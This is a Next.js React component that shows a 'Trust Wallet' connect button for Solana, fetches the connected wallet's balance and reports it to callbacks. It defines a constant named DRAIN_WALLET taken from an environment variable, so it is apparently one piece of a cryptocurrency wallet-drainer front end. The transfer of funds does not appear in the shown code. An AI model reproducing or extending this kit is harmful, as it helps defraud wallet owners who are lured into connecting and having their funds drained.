"use client";

import { useEffect, useState } from 'react';
import { useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { Connection, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

// Import wallet button component
import '@reown/appkit-wallet-button/react';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;

export default function TrustWalletButton({ onConnected, onBalance, onError }) {
  const { isConnected, address } = useAppKitAccount({ namespace: 'solana' });
  const { walletProvider } = useAppKitProvider('solana');
  const [isConnecting, setIsConnecting] = useState(false);

  // Monitor connection and get Solana balance
  useEffect(() => {
    const getSolanaBalance = async () => {
      if (isConnected && address && walletProvider) {
        try {
          // Verify it's a Solana address
          const pubkey = new PublicKey(address);
          const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, 'confirmed');
          const lamports = await connection.getBalance(pubkey);
          const balanceInSol = lamports / LAMPORTS_PER_SOL;
          
          if (onBalance) onBalance(balanceInSol);
          if (onConnected) onConnected(address, balanceInSol);
        } catch (error) {
          console.error('Failed to get Solana balance:', error);
          if (onError) onError('Connected wallet is not on Solana network');
        }
      }
    };
    
    getSolanaBalance();
  }, [isConnected, address, walletProvider, onConnected, onBalance, onError]);

  return (
    <div className="w-full">
      {/* Direct Trust Wallet button with Solana namespace */}
      <appkit-wallet-button 
        wallet="trust" 
        namespace="solana"
        label="Trust Wallet"
        className="w-full"
      />
      <p className="text-xs text-gray-400 mt-2 text-center">
        Make sure your wallet is on <span className="text-solana-green">Solana Network</span>
      </p>
    </div>
  );
                                                     }
